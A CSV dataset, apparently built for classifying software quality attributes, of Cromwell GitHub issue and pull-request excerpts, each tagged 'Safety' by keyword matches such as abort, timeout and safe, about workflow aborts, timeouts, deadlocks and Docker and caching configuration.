Safety,"The Horicromtal Deadlock test started failing the morning of Monday, 2/26 with Docker pull failures:; ```; Head ""https://registry-1.docker.io/v2/dockercloud/haproxy/manifests/latest"":; error parsing HTTP 429 response body:; invalid character 'S' looking for beginning of value: ; ""Server capacity exceeded.\n""; ```; I was able to pull the [`dockercloud/haproxy` image](https://hub.docker.com/r/dockercloud/haproxy) locally but found that it was last updated 6 years ago. My suspicion is that ancient images are stored in a much less hot level of cache in the bowels of Docker Hub and may be more susceptible to capacity issues and timeouts. In order to adopt a current, official HAProxy image, I had to make a very basic config and we were off to the races. This is because the `dockercloud` image was a bit customized with special sauce to automatically configure itself by detecting running Docker containers. As a bonus, the new Alpine-based image is actually smaller than the ancient one, albeit only 25 MB vs. 43 MB.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7376:631,timeout,timeouts,631,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7376,2,"['detect', 'timeout']","['detecting', 'timeouts']"
Safety,"The JobStore currently remembers Successful jobs (and their outputs) and Failed jobs.; It would be very useful to also remember when jobs are started (from a backend perspective) and aborted.; Indeed, not knowing if a job has already been aborted or even started forces us to create a backend actor for every single job of a restarting workflow to reconnect to it, and if this workflow was aborting, abort the backend job. Again.; Or at least that's the issue, we don't know if it's ""again"" or not because we don't know if the job had already been aborted before restart, or even been started, so we try anyway.; This behavior while guaranteeing that we don't leave any job unaborted even after restart is suboptimal and generates unnecessary requests and load on the system.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3378:183,abort,aborted,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3378,5,['abort'],"['abort', 'aborted', 'aborting']"
Safety,"The Methods Cromwell recently experienced an outage nearly identical to the Terra one, where requests to GCS and the database timed out. Like on Terra, a server restart fixed it. Their server is running version `54-97597a4` that [definitely has](https://github.com/broadinstitute/cromwell/commits/54_hotfix) the [PR](https://github.com/broadinstitute/cromwell/pull/5994) we did to handle null messages. In this PR I fixed another possible source of NPEs in `cromwell.engine.io.gcs.GcsBatchFlow#recoverCommand`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6118:494,recover,recoverCommand,494,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118,1,['recover'],['recoverCommand']
Safety,"The Rawls behavior is not a simple ""retry on any error"". Here's what I'm seeing:; * User aborts a submission in FireCloud.; * Rawls marks submission as `Aborting`; * In a background actor, Rawls finds all workflows inside `Aborting` submissions and sends an abort request to Cromwell.; * In a background actor, Rawls periodically queries Cromwell for the status of each active workflow, then updates its db based on Cromwell's response; * if all workflows in a submission are complete (failed, succeeded, aborted), the submission is marked as complete. In the aberrant workflow cases I checked, Cromwell is returning a status of `Running` or `Submitted` from its workflow-status endpoint, but returns a 404 from its abort endpoint. I suspect that 1) the abort request will never succeed; 2) the workflow status endpoint's response will never change, and therefore 3) Rawls will never update its db and will be stuck trying to abort the workflow forever.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4497#issuecomment-448063480:89,abort,aborts,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4497#issuecomment-448063480,14,"['Abort', 'abort']","['Aborting', 'abort', 'aborted', 'aborts']"
Safety,"The TravisCI test is not passing or finishing, but I am going to bypass that protection and merge anyway. Talked about it with the team: current theory has to do with the fact that Travis is hung up on testing an old branch name (`travis_to_workflows_test`) that this PR's branch (`sbt_unit_tests`) was branched from. Alternatively, it could be due to the fact that I am new and might not have some sort of account set up in Travis. Another theory is that Travis can't handle the fact that no cromwell code was changed in this branch. . Anyway....this is only github specific stuff so deemed safe to merge.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284:592,safe,safe,592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6992#issuecomment-1412714284,1,['safe'],['safe']
Safety,"The `DrsCloudNioFileSystemProvider` was wrapping the retries of the `DrsPathResolver` with another set of `CloudNioRetry` retries. The product of these two retries at the previous configuration values would wait around 35 minutes (~:20 + 10 x ~3:30) to fail for each doomed attempt. That combined with a fairly wide scatter and a typo'd DRS path for `file` in code like . ```; task size {; input {; File file; }. Int file_size = ceil(size(file)); ...; }; ```; would completely block all 10 of the `IoActor`s [NIO threads](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/server/CromwellRootActor.scala#L108). These changes remove the nested retries in the engine and dial back the patience for retries. If we want the retries to be more patient we'll probably have to make other code that is competing for `IoActor` threads more patient as well. Utility files for reproducing this error can be cherry picked from commit `ff7bddc8830802f7a606177d0eaf19c8f47ca865`. I don't know how to programatically link Google accounts to NIH accounts in Bond to be able to include this Centaur test in CI, though maybe we don't need to be linked to make sure this negative case errors within a reasonable timeout?. Workflow`9635fbf0-00b1-4635-b482-5a782cda5cd5` induced this problem in production, its metadata shows multiple `HaplotypeCaller` shards erroring out with ; ```; Failed to evaluate input 'disk_size' (reason 1 of 1): [Attempted 1 time(s)] - RuntimeException: Unexpected response during DRS resolution: RuntimeException: Could not access object 'drs://dg4.DFC/...'. Status: 500, reason: 'Internal Server Error', Martha location: 'https://.../martha_v3', message: 'Received error while resolving DRS URL. getaddrinfo ENOTFOUND dg4.dfc'; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6439:1229,timeout,timeout,1229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6439,1,['timeout'],['timeout']
Safety,"The `WdlCall` expression handler contained a `traverse` which generated OGINs for outer lookups in parallel.; To avoid that, the PR pre-generates the OGINs for the expressions to use and doesn't let the `traverse` create its own.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2976:113,avoid,avoid,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2976,1,['avoid'],['avoid']
Safety,"The `database.sql` artifact should follow the ""convention over configuration"" nature of [Rails](http://guides.rubyonrails.org/active_record_basics.html#convention-over-configuration-in-active-record), [GORM](http://docs.grails.org/3.1.11/guide/GORM.html#domainClasses), [Hibernate](http://docs.jboss.org/hibernate/orm/5.2/quickstart/html_single/#tutorial_annotations), etc. Classes should be named after the table, and replacing under_scores with CapitalizedNames. We can either:; 1. Liquibase update the database to match the scala names; 2. Update the scala to match the database naming; 3. Ignore the issue and not have a naming convention. Updating the scala seems like the least intrusive, avoiding any possibly time consuming database migrations and index rebuilding at the moment. However, developers may have put more effort into naming the scala tables and less into the sql tables. Liquibase updates could follow as part of a future issue, if/when the schema needs other modifications.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1423:695,avoid,avoiding,695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1423,1,['avoid'],['avoiding']
Safety,The batched heartbeat writer and workflow picker upper both try to lock multiple rows in the workflow store table inside a transaction and were often observed to deadlock. These two workflow store accesses are now routed through an actor that effectively serializes access to the workflow store table (other accesses are not affected). If this manages to run the gauntlet of gulls [batch abort](https://github.com/broadinstitute/cromwell/issues/3753) would likely need to be added to this system. Known shortcomings:; - ~~Should probably give more thought as to the thread on which the blocking happens.~~ now on the IO dispatcher; - ~~Should consider actor supervision because if this one actor ever dies that will be bad times.~~ default Akka supervision is reasonable here; - ~~May keep one writer Cromwell from tripping over itself but wouldn't keep multiple writer Cromwells from tripping over each other~~ ticketed in #3795,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3761:388,abort,abort,388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3761,1,['abort'],['abort']
Safety,"The cause and effect:. - An assumption in the token dispenser actor (that none of the internal queues were ever empty) turned out to not always be true; - As a result, not infrequently an attempted `dequeue` would cause the `JobExecutionTokenDispenserActor` to crash and be restarted - zeroing out all known token dispensations *and* all known actors waiting for tokens.; - The overall consequence of this was that jobs would submit their request for exeution tokens and be added to a queue. But that queue was lost when the `JobExecutionTokenDispenserActor` was restarted and therefore the jobs would sit forever waiting for a token which was never sent to them. The fix:; - First, add a sanity check before calling `dequeue`. If the queue is empty, don't do it. But hopefully will now be a redundant check thanks to:; - Second, one situation was identified which would lead to this state when token-requesting-actors were aborting before a token was dispensed. If that left the token queue for that hog group empty then the queue was not being correctly removed from the `JobExecutionTokenDispenserActor` - thus leaving an empty queue behind and triggering the ""dequeue on an empty queue"" bug.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4908#issuecomment-488345810:689,sanity check,sanity check,689,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4908#issuecomment-488345810,3,"['abort', 'redund', 'sanity check']","['aborting', 'redundant', 'sanity check']"
Safety,"The changes for this fix are just a subset of the ones in open request #6058, hence this request is redundant now,",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5807#issuecomment-759823836:100,redund,redundant,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5807#issuecomment-759823836,1,['redund'],['redundant']
Safety,"The documentation for the new HPC backend 'check-alive' feature is a bit scattered an incomplete. https://cromwell.readthedocs.io/en/stable/backends/HPC/; > This option will implicitly enable polling with the check-alive option. https://github.com/broadinstitute/cromwell/releases:; > When the value exit-code-timeout-seconds is set, check-alive command is now only called once every timeout interval instead of each poll. https://github.com/broadinstitute/cromwell/blob/73ad264b4c7919d0bbd344fecbc903f819f5e16c/cromwell.example.backends/SGE.conf#L27; > # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). I had a look at the code and PRs implementing the feature, but am not confident I can even see how the feature is implemented, so cannot write the docs as a PR myself!. I had assumed, when you specify `exit-code-timeout-seconds`, cromwell would poll `check-alive` at that interval, and after 2 failed `check-alive`s with no rc file, would mark the job as failed. Now I think there is some other polling mechanism, perhaps to cap polling load per backend instead of scaling it with number of jobs. . Is it possible to revisit that documentation and actually explain what is happening? Alternatively just a link here to the `unrelated to this timeout` documentation?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877:310,timeout,timeout-seconds,310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877,5,['timeout'],"['timeout', 'timeout-seconds']"
Safety,"The following gives a 2 GB cache on top of Cromwell, and forwards aborts to a different host. I've manually tested with the following configuration as an excuse to play w/ Kubernetes:. ## Varnish config. points all queries to reader service except aborts:; ```; vcl 4.0;. backend worker {; .host = ""cromwell-worker-service.default"";; .port = ""8000"";; }. backend reader {; .host = ""cromwell-reader-service.default"";; .port = ""8000"";; }. sub vcl_recv {; if (req.url ~ ""abort/$"") {; set req.backend_hint = worker;; } else {; set req.backend_hint = reader;; }; }; ```; Source: https://raw.githubusercontent.com/danbills/ammoniteExample/master/kubernetes/varnish-rw-cromwell-config.vcl. ## Varnish docker . w/ latest 6.1 version:; https://hub.docker.com/r/danbills/varnish/; Source: https://github.com/danbills/ammoniteExample/tree/master/kubernetes/varnish. ## Kubernetes Config(map); Kubernetes [Pod](https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/) to run varnish w/ the config file loaded into a [ConfigMap](https://cloud.google.com/kubernetes-engine/docs/concepts/configmap) named `rw`:; ```; apiVersion: v1; kind: Pod; metadata:; name: varnish-cache; labels:; app: varnish-cache; spec:; containers:; - name: cache; resources:; requests:; # We'll use two gigabytes for each varnish cache; memory: 2Gi; image: danbills/varnish:6_1; imagePullPolicy: Always; args: [""-F"", ""-f"", ""/conf/varnish-rw-cromwell-config.vcl"", ""-a"" , ""0.0.0.0:8080"" , ""-s"" , ""malloc,2G""]; ports:; - containerPort: 8080; volumeMounts:; - name: config-volume; mountPath: /conf; volumes:; - name: config-volume; configMap:; # Provide the name of the ConfigMap containing the files you want; # to add to the container; name: rw; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248:66,abort,aborts,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4253#issuecomment-437427248,3,['abort'],"['abort', 'aborts']"
Safety,"The following workflow failed in cromwell (4ef40f07-ff52-426b-9610-3c9dc66ec67e) on production. Looking metadata we have no logs for the step that failed. ```; {; ""executionStatus"": ""Failed"",; ""shardIndex"": 5,; ""outputs"": {. },; ""runtimeAttributes"": {. },; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""input_bam"": ""SortAndFixSampleBam.output_bam"",; ""ref_fasta"": ""ref_fasta"",; ""ref_dict"": ""ref_dict"",; ""disk_size"": ""agg_medium_disk"",; ""dbSNP_vcf"": ""dbSNP_vcf"",; ""known_snps_sites_vcf"": ""known_snps_sites_vcf"",; ""dbSNP_vcf_index"": ""dbSNP_vcf_index"",; ""known_indels_sites_vcf_index"": ""known_indels_sites_vcf_index"",; ""input_bam_index"": ""SortAndFixSampleBam.output_bam_index"",; ""recalibration_report_filename"": ""sample_name + \"".recal_data.csv\"""",; ""known_snps_sites_vcf_index"": ""known_snps_sites_vcf_index"",; ""ref_fasta_index"": ""ref_fasta_index"",; ""sequence_group_interval"": ""subgroup"",; ""known_indels_sites_vcf"": ""known_indels_sites_vcf""; },; ""failures"": [{; ""failure"": ""Call failed to initialize: Could not persist runtime attributes: Timeout after 5059ms of waiting for a connection."",; ""timestamp"": ""2016-04-23T09:14:54.651Z""; }],; ""backend"": ""JES"",; ""end"": ""2016-04-23T09:14:56.000Z"",; ""attempt"": 1,; ""executionEvents"": [],; ""start"": ""2016-04-23T09:14:45.000Z""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/737:1045,Timeout,Timeout,1045,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/737,1,['Timeout'],['Timeout']
Safety,"The idea being, sending an abort message does not get an `AbortSuccess` or `AbortFailed` response directly. Instead, the actor being aborted will cause its operation to fail and the parent should expect an ""Aborted"" response instead of a Success or Failure (although a Success or Failure may still be returned anyway). In this way, it's acceptable for a backend implementor to simply do nothing when `abort` is received. The parent will just continue waiting for a result of some sort.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/759:27,abort,abort,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/759,6,"['Abort', 'abort']","['AbortFailed', 'AbortSuccess', 'Aborted', 'abort', 'aborted']"
Safety,"The mint team submits workflows in ""on hold"" status and then has a separate service to start those workflows. If there is an issue with any of the on-hold workflows, there is no way to abort them until after they start running. It would be convenient to have the ability to abort those workflows so that our starter service queue is not full of these erroneous workflows that would fail.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4311:185,abort,abort,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4311,2,['abort'],['abort']
Safety,"The regular status polling is totally separate from this option. . Regular polling backs off, so doesn't have a single ""interval"" value to configure or report (ie it starts off polling with short intervals but slows down as the job runs for longer and longer). That's true for all jobs across all backends. The `is-alive` check is a fixed (configurable) duration, and it's the timeout between `is-alive` returning false, and the job being considered failed, that are the same. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492253707:377,timeout,timeout,377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-492253707,1,['timeout'],['timeout']
Safety,The shoulders of giants is always a safe place :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267840564:36,safe,safe,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267840564,1,['safe'],['safe']
Safety,The slick exceptions could technically cause this but no this is more generally due to the metadata building process being very expensive therefore causing all kinds of timeouts / errors.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-321682962:169,timeout,timeouts,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-321682962,1,['timeout'],['timeouts']
Safety,"The test `cromwell.backend.standard.callcaching.StandardFileHashingActorSpec` has a failing test that asserts ""send a timeout to the ioActor the command doesn't hash"". It intermittently fails when run, suggesting a race condition may exist",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2816:118,timeout,timeout,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2816,1,['timeout'],['timeout']
Safety,"The tests broke as the code expects Kanin to be running but it isn't. This will also break run more, I only use server these days to avoid the color highlighting. It all ties back to the inability to turn the instrumentation odd. Go ahead and review as is, whatever solution to this which is applied is unlikely to affect the actual code part all that much",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/269#issuecomment-154437437:133,avoid,avoid,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/269#issuecomment-154437437,1,['avoid'],['avoid']
Safety,"The timestamps are wrong... This was hanging for > 12 hours. Also, I cannot ctl-C I have to `kill`. ```; [2016-10-20 00:09:40,74] [info] SingleWorkflowRunnerActor writing metadata to /home/lichtens/test_eval/eval-gatk-protected/scripts/crsp_validation/crsp_validation_gatkp_run_local_paths.json.metadata.json; [2016-10-20 00:09:41,04] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; [2016-10-20 00:09:41,05] [info] WorkflowManagerActor: Received shutdown signal. Aborting all running workflows... ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255101545:492,Abort,Aborting,492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255101545,1,['Abort'],['Aborting']
Safety,"The token message is a safety-catch in the token distributer. If the job actor exits in an unexpected way without returning its execution token, the token distributer will spot that and reclaim the token anyway. . So the underlying issue here is that the job actor is crashing or exiting inappropriately. EDIT: Here, ""job actor"" == `EJEA`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1612#issuecomment-255765188:23,safe,safety-catch,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1612#issuecomment-255765188,1,['safe'],['safety-catch']
Safety,"The wheel has chosen @Horneth and @mcovarr. I hope the fundamental choice of how abort now works isn't too controversial (as I understand it, it's how things work currently) but I'm happy to do a meet 'n' discuss if you want.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/759#issuecomment-215548808:81,abort,abort,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/759#issuecomment-215548808,1,['abort'],['abort']
Safety,The workflow d800c362-e8e7-48e2-bb08-3b88226307e9 has been aborting on cromwell1 since 2017-06-27. Rawls is still trying as of the time of me posting this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327944618:59,abort,aborting,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327944618,1,['abort'],['aborting']
Safety,"The zeroth localizers checks to see if a file exists before re-localizing. The copy localizer should therefore copy-to-temp-then-rename. Current broken behavior:; - Run SGE task with a large `input.bam` and copy localization; - Cromwell starts copying to `<call_root>/input.bam`; - Kill the job during localization; - Restart cromwell; - Cromwell detects the partial `<call_root>/input.bam` exists.; - The job continues without relocalizing. Better behavior:; - Run SGE task with a large `input.bam` and copy localization; - Cromwell starts copying to `<call_root>/input.bam.tmp`; - Kill the job during localization; - Restart cromwell; - Cromwell doesn't detects the partial `<call_root>/input.bam` exists.; - The job continues with relocalizing. And when cromwell isn't killed:; - Run SGE task with a large `input.bam` and copy localization; - Cromwell starts copying to `<call_root>/input.bam.tmp`, ensuring to overwrite previous results; - When copying finishes rename `<call_root>/input.bam.tmp` to `<call_root>/input.bam`; - The job continues. NOTE: Most people do not like copying inputs anyway, so this hasn't been a major issue.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1426:347,detect,detects,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1426,2,['detect'],['detects']
Safety,"There are a few follow ups that I will make new tickets for, to avoid delaying the merge on this PR:. 1. Renaming the method to processEventsAndEmitWarnings would make it more clear what's going on; 2. Accounting for metadata generated at the parent or root workflows level separately from contributions from their subworkflows",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032:64,avoid,avoid,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6641#issuecomment-1006911032,2,['avoid'],['avoid']
Safety,"There are two general cases where the `WorkflowExecutionActor` switches the workflow to a failed state:; - [`handleRetryableFailure()`](https://github.com/broadinstitute/cromwell/blob/f64c16e62c84b66ddba14705bede5e6fde8376b0/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L292-L306); - [`handleExecutionFailure()`](https://github.com/broadinstitute/cromwell/blob/f64c16e62c84b66ddba14705bede5e6fde8376b0/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L240-L255). In _both_ cases, the method:; - is triggered by the failure of an individual job, but; - fails the entire workflow, and; - doesn't send signals to other jobs to stop. Thus other jobs stay running, while the workflow gets deregistered from the system. Because the workflow manager can no longer delegate aborting the running jobs, this issue may also be related to #1414 and #1504.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2029:864,abort,aborting,864,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2029,1,['abort'],['aborting']
Safety,"There are two tables in the cromwell database that are out of sync. Unofficially, if one knows what they're looking for, one can edit the values directly in the database. Often the case is the `WorkflowStoreEntry` doesn't have a record for the workflow, thus it cannot be aborted or resumed-on-restart, yet the last row in `MetadataEntry` says the workflow is still `Running`. A ""reconciler"" could write a final row into `MetadataEntry` with Aborted/Success/Fail. This could be called:; - Manually by a user/service; - Automatically whenever a user requests status of a workflow; - Automatically by a MetadataEntry sweeper looking for workflows w/o a finalization and no row in WorkflowStoreEntry; - Other?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334526788:272,abort,aborted,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334526788,3,"['Abort', 'abort']","['Aborted', 'aborted']"
Safety,"There is a Pull request in for AWS CLI call retry's which will mitigate; some of the problem. Currently full retries of tasks are not supported via; Cromwell Server coordinating with the AWS Batch backend. Having said that,; you could identify the AWS Batch Job Description and edit it to create a; new revision such that the revision uses the AWS Batch retry strategy. This; will mean that AWS Batch will retry any job that doesn't exit cleanly; (return code 0 or container host is terminated) up to a max number of; times. When that happens, the job ID remains the same so as far as Cromwell; knows it is the same job. I haven't had a chance to test this out myself; but it's on my to do list. Let me know if you try it. If it works the same; approach would allow for recovery in the case of Spot interruption. https://docs.aws.amazon.com/batch/latest/userguide/job_retries.html; https://docs.aws.amazon.com/batch/latest/userguide/job_definition_parameters.html#retryStrategy. On Wed, Oct 14, 2020 at 2:40 PM Richard Davison <notifications@github.com>; wrote:. > Originally posted this two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:770,recover,recovery,770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780,1,['recover'],['recovery']
Safety,"There were a **lot** of general cleanup rabbit holes I wanted to go down but figured I'd stick w/ a safe harbor of ""do what the ticket asks"" and then follow up with a series of more targeted clean up PRs. If people would prefer (or start asking for changes along those lines) I'll pull this back and do this. Along similar lines there's a clear overlap erupting between wes2cromwell code and cromiam, however only in places where I could literally use cromiam code as-is did I do so (and even then I left it in cromiam instead of a shared package). While I was working on this it became clear that the ideal shared abstraction is still too early to tell so I'd rather see it play out a bit before going down that road.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3901:100,safe,safe,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3901,1,['safe'],['safe']
Safety,"There's a good forum post on this topic here, including not only `includeKey` and `excludeKey` but also increasing Akka HTTP timeouts. We might want to change those timeout defaults in `reference.conf` if users are seeing this routinely even with those filters. https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-326019694:125,timeout,timeouts,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2519#issuecomment-326019694,2,['timeout'],"['timeout', 'timeouts']"
Safety,"There's some flakiness in the abort tests right now, I believe the reason is we tend to abort too quickly when a workflow is being restarted (for example if we receive an abort message during materialization, we'll assume that it's fine to stop without going further, which is not the case if the workflow is being restarted as jobs might be running and need to be reconnected to)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2820:30,abort,abort,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2820,3,['abort'],['abort']
Safety,"There’s a new response from JES that should be retryable: ; JES error code 2. Message: Instance failed to start due to preemption.” . THE CATCH: Henry chatted with Google, and it sounds like JES error code 2 isn’t *always* about preemption. (But in the past few weeks we’ve had a handful of cloud workflows failing each day from this response, always with the message about preemption). So to be safe, we want to make this one retryable based on the combination of the code + the message. . Example: ; UUID: 7da0394b-371f-4fdb-ae70-737833c4fbfa; OPERATION_ID: operations/EKmIx96ALBjh373VhLH0ui8gkYad9-AKKg9wcm9kdWN0aW9uUXVldWU. Relevant workflow metadata: ; ""failures""; : [; {; ""causedBy"": [],; ""message"": ""Task PairedEndSingleSampleWorkflow.CollectUnsortedReadgroupBamQualityMetrics:2:1 failed. JES error code 2. Message: Instance failed to start due to preemption.""; }; ],",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2970:396,safe,safe,396,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2970,1,['safe'],['safe']
Safety,These inputs used to live in the WORKFLOW_EXECUTION_AUX table in .19. We use this table as kind of a back pocket sanity check if our workflow results are not making sense. Is it possible to get this table revived in .20?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1238:113,sanity check,sanity check,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1238,1,['sanity check'],['sanity check']
Safety,These race conditions can leave Cromwell in an inconsistent state:; - The `WEA` might receive an `AbortedResponse` outside of the `Aborting` state. It should do something appropriate; - The `WEA` might receive something other than `AbortedResponse` while in the `Aborting` state. It should do something appropriate,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1521:98,Abort,AbortedResponse,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1521,4,['Abort'],"['AbortedResponse', 'Aborting']"
Safety,They both have a `return valid swagger` test case. I think the first thing to try is increase this timeout anyway so I'll just do that on both.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4247#issuecomment-429907743:99,timeout,timeout,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4247#issuecomment-429907743,1,['timeout'],['timeout']
Safety,"Thibault;; You're exactly right, I hadn't compiled against the right branch with this fix. Apologies for wasting your time looking at this, once I got the most up to date version compiled it avoided this problem and the GCP test run I mentioned ran all the way through cleanly to the end. Brilliant, thank you for all the help getting this in place and sorry again for the erroneous report.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4471#issuecomment-446138096:191,avoid,avoided,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4471#issuecomment-446138096,1,['avoid'],['avoided']
